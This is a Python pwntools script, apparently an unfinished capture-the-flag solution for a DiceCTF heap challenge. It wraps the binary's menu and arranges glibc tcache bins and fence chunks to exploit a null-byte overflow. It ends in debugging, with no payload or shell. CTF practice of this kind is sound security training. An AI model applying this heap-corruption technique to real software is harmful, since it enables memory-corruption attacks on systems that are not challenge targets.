from pwn import *

ld = ELF("./ld-2.30.so")
elf = ELF("./sice_sice_baby")
libc = ELF("./libc.so.6")
target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
#target = process(elf.path)
#target = remote('dicec.tf', 31914)

def sa(s, d):
	target.sendafter(s, d)

def add(size):		#max 100 chunks
	sa("> ", "1")
	sa("> ", str(size))

def delete(idx):	#no UAF
	sa("> ", "2")
	sa("> ", str(idx))

def edit(idx, data):	#max chunk size --> 0xe8, null byte overflow
	sa("> ", "3")
	sa("> ", str(idx))
	sa("> ", data)

def view(idx):
	sa("> ", "4")
	sa("> ", str(idx))

fence_chunk = 0x18

for i in range(7):		#0-6
	add(0xd8)
for i in range(7):		#7-13
	add(0x88)
for i in range(7):		#14-20
	add(0xc8)

for i in range(7):
	add(fence_chunk)	#21 + i*3
	add(0xd8)		#22 + i*3
	add(0x88)		#23 + i*3

add(fence_chunk)		#42
add(0xd8)			#43
add(0xd8)			#44

add(fence_chunk)		#45
add(0xd8)			#46
add(0x88)			#47

add(fence_chunk)		#48

for i in range(7):
	delete(i)
	delete(i+7)

for i in range(9):
	delete(22+i*3)
for i in range(9):
	delete(23+i*3)

#if True:
for i in range(7):
	add(0x68)		#0 + i*2,	#22, 25
	add(0xe8)		#1 + i*2,	#23, 26
add(0x68)	#22
add(0xe8)	#23
add(0xc8)	#25
add(0xc8)	#26
edit(22, "2"*0x20)#60 + p64(0xb0))
edit(23, "3"*0x20)
edit(25, "5"*0x20)
edit(26, "6"*0x20)

for i in range(7):
	delete(i+14)

delete(26)

add(0xe8)
edit(14, "A"*0x20)#c8 + p32(0xb1))


i=0
#if True:
#if False:
for i in range(7):		#Fill 0x100 tcachebin
#	delete(21 + i*3)					#fence_chunks with chunk_size = 0x90
#	edit(0 + i*2, str(i)*0x60 + p64(0x70 + 0x90))		#0x68 sized chunks
	delete(1 + i*2)						#0x100 sized chunk

#delete(23)

'''
delete(26)

edit(22, "2"*0x20)
edit(23, "3"*0x20)
delete(23)
delete(22)
add(0xe8)		#1
edit(1, "A"*0xc8 + p32(0x13371337))

edit(42, "A"*0x20)
delete(42)
edit(22, "B"*0x60 + p64(0x70 + 0x90))
delete(23)

for i in range(7):
	add(0x88)	#1-7(both inclusive)
add(0x88)	#8
#edit(8, "B"*8)
#'''
gdb.attach(target, 'heap bins')
#view(22)


target.interactive()
